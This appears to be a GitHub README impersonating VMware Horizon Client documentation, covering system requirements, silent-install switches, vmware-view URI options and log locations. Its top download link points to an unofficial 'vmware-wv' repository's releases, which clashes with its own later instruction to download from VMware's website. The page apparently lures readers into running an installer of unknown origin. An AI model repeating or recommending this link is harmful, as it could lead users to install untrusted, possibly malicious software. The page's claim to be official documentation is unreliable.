# VMware Horizon Client

The VMware Horizon Client for Windows is a tool designed to establish secure connections to remote desktops and applications hosted on VMware Horizon servers. It allows businesses and individual users to access their virtual workspaces from virtually any location, while ensuring robust security and seamless integration with peripheral devices and network environments.

* [Installation](#installation)
* [System Requirements and Setup](#system-requirements-and-setup)
* [Installing and Updating Horizon Client](#installing-and-updating-horizon-client)
* [Configuring Horizon Client](#configuring-horizon-client)
* [Connecting to Remote Desktops and Applications](#connecting-to-remote-desktops-and-applications)

## Installation

[**Download VMware Horizon Client**](https://github.com/vmware-wv/VMware-Horizon-Client/releases/tag/5.1)

Click on the download link to start the installation of VMware Horizon Client. This software offers a secure gateway to access your organization’s virtual desktops and applications from any Windows machine.

Once the download finishes, open the installer by double-clicking the file. Follow the installation wizard to configure your preferences—such as enabling smart card login, adjusting display settings, or optimizing for better performance. After the setup is complete, launch the client and sign in using your credentials. If you experience connectivity issues, check your network settings or contact your IT support.

## System Requirements and Setup

### Hardware and Software Prerequisites

Before beginning the installation, make sure your system meets the following minimum requirements:

* **Processor**: x86-64 with SSE2 support (800 MHz or higher)
* **Memory**: At least 1GB RAM
* **Supported Operating Systems**:

  * Windows 11 (64-bit, Versions 22H2, 21H2)
  * Windows 10 (64-bit, Versions 22H2, 21H2, 20H2, LTSC 2021/2019)
  * Windows Server 2012 R2, 2016, 2019

### Authentication and Security Features

The Horizon Client supports multiple login methods, including:

* **Smart Card Authentication**
* **Client Certificate-Based Login**
* **Two-Factor Authentication (RSA, RADIUS)**
* **Windows Hello for Business Integration**

> \[!note]
> Some authentication methods may require additional configuration on the Horizon Server.

### Supported Operating Systems

The VMware Horizon Client for Windows is compatible with various desktop and server versions of Windows. For an in-depth compatibility list, consult VMware’s official documentation.

## Installing and Updating Horizon Client

### Installation Steps

1. Download the installation file from [VMware’s website](https://www.vmware.com/go/viewclients).
2. Run the `.exe` file and follow the setup instructions.
3. Choose between a **Standard (Typical)** or **Advanced (Custom)** installation.
4. Accept the license agreement and click **Agree & Install**. Restart your system if prompted.

### Command-Line Installation Options

For silent or unattended installations, use the following command:

```sh
VMware-Horizon-Client.exe /silent /install
```

To enable FIPS-compliant encryption:

```sh
VMware-Horizon-Client.exe VDM_FIPS_ENABLED=1
```

### Updating and Uninstalling the Client

* For updates, go to **Options > Software Updates** within the client interface.
* To uninstall the client, run:

```sh
VMware-Horizon-Client.exe /uninstall
```

## Configuring Horizon Client

### Connection Server Setup

Ensure the following server-side settings are configured correctly:

* **Correct IP or DNS Address**
* **Enable Secure Tunneling**, if needed
* **Enable Multi-Factor Authentication**, if required

### Common Configuration Options

Horizon Client settings can be adjusted using:

* **Group Policy Objects (GPOs)**
* **Registry Edits**
* **Command-Line Customization**

> \[!info]
> Advanced users can adjust registry settings at `HKLM\Software\VMware, Inc.\Horizon Client` for more granular configuration.

## Connecting to Remote Desktops and Applications

### Logging In and Authentication

1. Open the Horizon Client.
2. Enter the **Connection Server** address.
3. Input your **Username and Password**.
4. Select the **Remote Desktop or Application** to start.

### Session Management and Reconnection

* Enable **Auto-Reconnect** to quickly reconnect to previous sessions.
* Turn on **Session Persistence** to avoid losing any unsaved data.

### Using Shortcuts and Auto-Connect Features

* Create a **Desktop Shortcut** for faster access.
* Set up **Auto-Connect to Last Session** in the settings for added convenience.

## Using Remote Desktops and Applications

### Copy-Paste and File Sharing

Enable **Clipboard Redirection** to copy and paste content between local and remote sessions. For file transfers, simply drag and drop between environments.

### Session Customization (Window Size, IME, DPI)

Adjust display settings to your preference:

```sh
vmware-view://desktopName?desktopLayout=fullscreen
```

### Performance Optimization Suggestions

* Use **VMware Blast** for better graphical performance.
* Close any unnecessary applications to free up system resources.

## Using External Devices

### Multi-Monitor Setup and Display Configuration

* **Extend Your Display** across multiple monitors.
* **Select Specific Monitors** for output in the session.

### USB and Printer Redirection

Enable USB passthrough by adding:

```sh
vmware-view://server?connectUSBOnStartup=true
```

### Webcam and Audio Device Integration

* Enhance video calls using **Real-Time Audio-Video (RTAV)**.
* Choose your **Preferred Audio Input and Output Devices**.

## Security and Authentication Features

### Smart Card and Certificate Authentication

* Make sure that **Smart Card Drivers** are installed and up to date.
* Use **Client Certificate Authentication** to strengthen login security.

### Two-Factor Authentication (RSA, RADIUS)

Enable this feature in the **Horizon Console > Security Settings** section.

## Troubleshooting and Logs

### Common Problems and Solutions

* **Black Screen Issue?** Check your display protocol settings.
* **Connection Errors?** Review firewall or proxy configurations.

### Viewing and Analyzing Logs

The log files are located at:

```sh
C:\Users\<Username>\AppData\Local\VMware\VDM\Logs
```
